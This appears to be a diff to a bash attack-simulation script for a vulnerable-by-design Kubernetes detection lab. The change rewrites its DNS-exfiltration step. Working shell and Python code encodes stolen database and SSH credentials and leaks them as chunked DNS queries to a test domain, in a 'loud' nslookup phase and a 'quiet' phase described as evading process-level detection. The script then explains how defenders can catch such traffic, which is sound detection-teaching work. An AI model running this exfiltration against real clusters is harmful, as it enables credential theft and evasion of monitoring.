@@ -52,7 +52,7 @@ banner() {
   printf "  Step  4.  Dump Redis data (credentials, sessions, secrets)\n"
   printf "  Step  5.  Pivot: frontend -> admin pod (SSH with stolen creds)\n"
   printf "  Step  6.  Steal K8s secrets via admin pod SA\n"
-  printf "  Step  7.  Exfiltrate data via DNS tunneling\n"
+  printf "  Step  7.  Exfiltrate data via DNS tunneling (loud + quiet)\n"
 }
 banner
 
@@ -390,22 +390,65 @@ EXFIL_DATA="DB:${DB_USER}:${DB_PASS}@${DB_HOST}|SSH:${SSH_USER}:${SSH_PASS}@${SS
 ENCODED=$(echo "$EXFIL_DATA" | base64 | tr '+/' '-_' | tr -d '=' | tr -d '\n')
 ok "Encoded payload (${#ENCODED} chars)"
 
-step "Sending DNS exfiltration queries from frontend pod"
 info "Each DNS query carries a chunk of data as a subdomain label"
 info "Target: *.exfil.cdrgoat-test.com (non-existent domain)"
 
+#############################################
+# Phase A - "loud" exfil via the nslookup binary
+# python:3.11-slim ships no nslookup, so install it first.
+# Generates process_exec events AND DNS queries.
+#############################################
+step "Phase A: DNS exfil via nslookup binary (loud)"
+RCE_TIMEOUT=90
+set +e
+HAS_NS=$(rce "command -v nslookup >/dev/null 2>&1 && echo YES || echo NO")
+set -e
+if ! echo "$HAS_NS" | grep -q "YES"; then
+  info "nslookup not in image - installing bind9-dnsutils"
+  rce "apt-get install -y -qq bind9-dnsutils >/dev/null 2>&1 || apt-get install -y -qq dnsutils >/dev/null 2>&1; echo OK" >/dev/null 2>&1
+  set +e
+  HAS_NS=$(rce "command -v nslookup >/dev/null 2>&1 && echo YES || echo NO")
+  set -e
+fi
+
 RCE_TIMEOUT=15
+if echo "$HAS_NS" | grep -q "YES"; then
+  ok "nslookup available"
+  CHUNK_NUM=0
+  echo "$ENCODED" | fold -w 50 | while IFS= read -r chunk; do
+    CHUNK_NUM=$((CHUNK_NUM + 1))
+    set +e
+    rce "nslookup ${chunk}.${CHUNK_NUM}.exfil.cdrgoat-test.com 2>&1 || true" >/dev/null 2>&1
+    set -e
+    printf "  [nslookup] chunk %s: %s%s.%s.exfil.cdrgoat-test.com%s\n" "$CHUNK_NUM" "$YELLOW" "$chunk" "$CHUNK_NUM" "$RESET"
+  done
+else
+  err "nslookup unavailable - skipping Phase A (Phase B still runs)"
+fi
+
+#############################################
+# Phase B - "quiet" exfil via the Python resolver
+# No binary, no install. DNS queries only, zero process_exec signal.
+#############################################
+step "Phase B: DNS exfil via Python resolver (quiet)"
+info "Same data, no binary executed - evades process-level detection"
 CHUNK_NUM=0
 echo "$ENCODED" | fold -w 50 | while IFS= read -r chunk; do
   CHUNK_NUM=$((CHUNK_NUM + 1))
   set +e
-  rce "nslookup ${chunk}.${CHUNK_NUM}.exfil.cdrgoat-test.com 2>&1 || true" >/dev/null 2>&1
+  rce "python3 -c \"
+import socket
+try:
+    socket.gethostbyname('${chunk}.${CHUNK_NUM}.q.exfil.cdrgoat-test.com')
+except Exception:
+    pass
+\"" >/dev/null 2>&1
   set -e
-  printf "  Sent chunk %s: %s%s.%s.exfil.cdrgoat-test.com%s\n" "$CHUNK_NUM" "$YELLOW" "$chunk" "$CHUNK_NUM" "$RESET"
+  printf "  [python]   chunk %s: %s%s.%s.q.exfil.cdrgoat-test.com%s\n" "$CHUNK_NUM" "$YELLOW" "$chunk" "$CHUNK_NUM" "$RESET"
 done
 RCE_TIMEOUT=30
 
-ok "DNS exfiltration complete"
+ok "DNS exfiltration complete (both phases)"
 
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "DNS exfiltration bypasses most egress controls because\n"
@@ -413,6 +456,15 @@ printf "DNS (UDP/53) is almost never blocked from pods.\n\n"
 printf "The detection signal: burst of DNS queries with ${RED}high-entropy\n"
 printf "subdomain labels${RESET} to an unknown domain from a pod that\n"
 printf "normally makes no such queries.\n\n"
+printf "Both phases sent the ${RED}same data${RESET} over the same channel,\n"
+printf "but they look different to a sensor:\n\n"
+printf "  Phase A (nslookup): apt-get install + nslookup execution\n"
+printf "                      -> ${GREEN}process_exec events + DNS queries${RESET}\n"
+printf "  Phase B (python):   resolver call inside the existing process\n"
+printf "                      -> ${RED}DNS queries ONLY, no process signal${RESET}\n\n"
+printf "A rule that only watches for DNS client binaries misses Phase B\n"
+printf "entirely. DNS exfiltration must be detected at the ${RED}query layer${RESET},\n"
+printf "not by hunting for nslookup/dig in process telemetry.\n\n"
 
 read -r -p "Step 7 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
@@ -427,7 +479,7 @@ printf "  ${RED}[3]${RESET}  ${RED}East-west #1:${RESET} frontend -> redis-cache
 printf "  ${GREEN}[4]${RESET}  Redis dumped: DB creds, SSH config, sessions, API keys\n"
 printf "  ${RED}[5]${RESET}  ${RED}East-west #2:${RESET} frontend -> admin-svc:2022 (SSH, cross-namespace)\n"
 printf "  ${GREEN}[6]${RESET}  K8s secrets stolen via admin pod SA\n"
-printf "  ${GREEN}[7]${RESET}  Data exfiltrated via DNS tunneling\n"
+printf "  ${GREEN}[7]${RESET}  Data exfiltrated via DNS tunneling (nslookup + Python resolver)\n"
 printf "%s\n" "====================================================================="
 printf "\n"
 printf "%s%s%s\n" "${BOLD}${RED}" "2 EAST-WEST ANOMALIES + 3 MISCONFIGURATIONS" "${RESET}"
